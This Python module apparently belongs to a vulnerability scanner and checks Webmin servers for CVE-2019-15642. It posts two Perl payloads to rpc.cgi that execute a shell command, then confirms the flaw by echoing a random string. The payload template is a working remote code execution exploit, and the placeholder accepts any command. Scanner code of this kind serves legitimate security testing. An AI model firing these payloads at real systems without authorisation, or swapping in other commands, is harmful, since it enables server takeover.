#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check

cve_2019_15642_payloads = [
    {
        'path': 'rpc.cgi',
        'data': 'OBJECT Socket;print "Content-Type: text/plain\\n\\n";$cmd=`{RCECOMMAND}`; print "$cmd\\n\\n";',
        'headers': {}
    },
    {
        'path': 'rpc.cgi',
        'data': 'OBJECT Socket;print "Content-Type: text/plain\\n\\n";$cmd=`{RCECOMMAND}`; print "$cmd\\n\\n";',
        'headers': {
            'User-Agent': 'webmin',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'fr',
            'Accept-Encoding': 'gzip, deflate'
        }
    },
]

def cve_2019_15642_scan(clients):
    ''' Webmin 1.920及之前版本中的rpc.cgi文件存在安全漏洞, 攻击者可借助特制的对象名称利用该漏洞执行代码
            需要身份验证(Cookie、Authorization等)
    '''
    client = clients.get('reqClient')

    vul_info = {
        'app_name': 'Webmin',
        'vul_type': 'RCE',
        'vul_id': 'CVE-2019-15642',
    }

    for payload in cve_2019_15642_payloads:
        randomStr = random_md5()
        RCEcommand = 'echo ' + randomStr
        
        path = payload['path']
        data = payload['data'].format(RCECOMMAND=RCEcommand)
        headers = payload['headers']

        headers['Referer'] = '{}/session_login.cgi'.format(client.protocol_domain)

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res(res.text, randomStr)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
